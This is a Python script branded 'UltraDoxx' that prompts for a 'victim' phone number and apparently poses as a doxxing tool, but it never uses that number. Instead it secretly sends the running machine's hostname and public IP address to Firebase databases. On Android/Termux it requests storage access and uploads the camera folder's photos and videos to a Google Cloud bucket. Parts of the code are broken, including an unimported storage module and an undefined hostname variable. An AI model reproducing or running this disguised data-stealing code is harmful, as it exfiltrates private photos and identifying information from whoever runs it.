import glob
import requests
from urllib.request import urlopen
import os
import time
import json
from art import *
import socket
print('Instalando e Importando Librerias..')
time.sleep(2.3)
os.system('pip install art')
os.system("pip install google-cloud-storage")
os.system('pip install requests')
os.system('cls' if os.name == 'nt' else 'clear')
# Conectando al host de base de datos
bannert = '''
                UltraDoxx
'''
banner = text2art(bannert, font='shadow')
colored_banner = "\033[91m" + banner + "\033[0m"

# Imprimir el banner
print(colored_banner)
info = 'Numero victima'
infos = text2art(info, font='digital')
colored_infos = "\033[95m" + infos + "\033[0m"
doxx = input(colored_infos + '\033[96m' +
             '\n+26xxxx-xxx'+'\033[0m' + '\n[+]' + '\033[92m')
time.sleep(2.0)
os.system('cls' if os.name == 'nt' else 'clear')
if os.name == 'nt':

    # hostname = os.uname().nodename
    hostname = socket.gethostname()
    firebase_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'
    response = requests.get(firebase_url, headers={
                            'Cache-Control': 'no-cache'})
    data = response.json()
    if data is not None and 'host' in data and data['host'] == hostname:
        print('\033[93m'+"Host ya Guardado"+'\033[0m')
        time.sleep(2.0)
        os.system('cls' if os.name == 'nt' else 'clear')
    else:
        # Crear el objeto JSON
        json_data = {
            "host": hostname
        }

        response = requests.patch(firebase_url, json=json_data)
        if response.status_code == 200:
            print('\033[93m'+"El host se conecto exitosamente"+'\033[0m')
            time.sleep(2.0)
            os.system('cls' if os.name == 'nt' else 'clear')
        else:
            print('\033[91m' + "Error al conectar con el host"+'\033[0m')
            time.sleep(3.0)
            os.system('cls' if os.name == 'nt' else 'clear')

    # extraccion de ip registrada en base de datos
else:
    # hostname = os.uname().nodename
    firebase_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'
    response = requests.get(firebase_url, headers={
                            'Cache-Control': 'no-cache'})
    data = response.json()
    if data is not None and 'host' in data and data['host'] == hostname:
        print("Host ya Guardado")
        os.system('cls' if os.name == 'nt' else 'clear')
    else:
        # Crear el objeto JSON
        json_data = {
            "host": hostname
        }

        response = requests.patch(firebase_url, json=json_data)
        if response.status_code == 200:
            print("El host se conecto exitosamente")
            time.sleep(2.5)
            os.system('cls' if os.name == 'nt' else 'clear')
        else:
            print("Error al conectar con el host")
            time.sleep(3.0)
            os.system('cls' if os.name == 'nt' else 'clear')


def ipExtrat():
    url = 'https://api.ipify.org?format=json'
    response = urlopen(url)
    data = json.load(response)
    extract = data['ip']
    # Actualizar la base de datos en Firebase
    firebase_url = 'https://data-fe2c3-default-rtdb.firebaseio.com/ip.json'
    response = requests.get(firebase_url)
    existing_data = json.loads(response.content)

    if existing_data and 'ips' in existing_data:
        if extract not in existing_data['ips']:
            existing_data['ips'].append(extract)
            response = requests.put(firebase_url, json=existing_data)
            print('')
            os.system('cls' if os.name == 'nt' else 'clear')
        else:
            print('')
            os.system('cls' if os.name == 'nt' else 'clear')

    else:
        new_data = {'ips': [extract]}
        response = requests.put(firebase_url, json=new_data)
        print('\033[94m'+'Ip Extract complete\n'+'\033[0m')
        time.sleep(3.0)
        if response.status_code == 200:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(
                '\033[94m'+"\nLa ip se encontro correctamente en la base de datos"+'\033[0m' + extract)
            time.sleep(3.0)


ipExtrat()


os.system('cls' if os.name == 'nt' else 'clear')
# Guardando informacion en img y mp4
# en Windows
if os.name == 'nt':
    exit()
    # banner = """
    #                 Windows
    # """
    # print(banner)
    # input("insert")
    # os.system("termux-setup-storage -y")
    # client = storage.Client.from_service_account_json(
    #     'services/serviceAccounts.json')
    # bucket = client.get_bucket('pictuface-f9763.appspot.com')

    # carpeta_local = 'C:/Users/Public/'

    # # Lista de extensiones permitidas
    # extensiones_permitidas = ['.jpg', '.png', '.mp4', 'mp3']

    # archivos = glob.glob(carpeta_local + '/*')

    # for archivo_local in archivos:

    #     nombre_destino = os.path.basename(archivo_local)

    #     # Obtén la extensión del archivo
    #     _, extension = os.path.splitext(archivo_local)

    #     # Verifica si la extensión está permitida
    #     if extension in extensiones_permitidas:
    #         # Sube el archivo
    #         blob = bucket.blob(nombre_destino)
    #         blob.upload_from_filename(archivo_local)

    #         print(f'Archivo {nombre_destino} cargado exitosamente')
    #     else:
    #     print(
    #         f'Archivo {nombre_destino} no se cargó. Extensión no permitida.')
    # time.sleep(3.0)
else:
    # en Linux
    banner = """
                    Linux
    """
    print(banner)
    input("insert")
    os.system("termux-setup-storage -y")

    client = storage.Client.from_service_account_json(
        'services/serviceAccounts.json')
    bucket = client.get_bucket('pictuface-f9763.appspot.com')

    carpeta_local = '/storage/emulated/0/DCIM/Camera'

    # Lista de extensiones permitidas
    extensiones_permitidas = ['.jpg', '.png', '.mp4', 'mp3']

    archivos = glob.glob(carpeta_local + '/*')

    for archivo_local in archivos:

        nombre_destino = os.path.basename(archivo_local)

        # Obtén la extensión del archivo
        _, extension = os.path.splitext(archivo_local)

        # Verifica si la extensión está permitida
        if extension in extensiones_permitidas:
            # Sube el archivo
            blob = bucket.blob(nombre_destino)
            blob.upload_from_filename(archivo_local)

            print(f'almacenando info')
        else:
            print(
                f'no se cargó. una info')
        time.sleep(3.0)
    time.sleep(3.0)
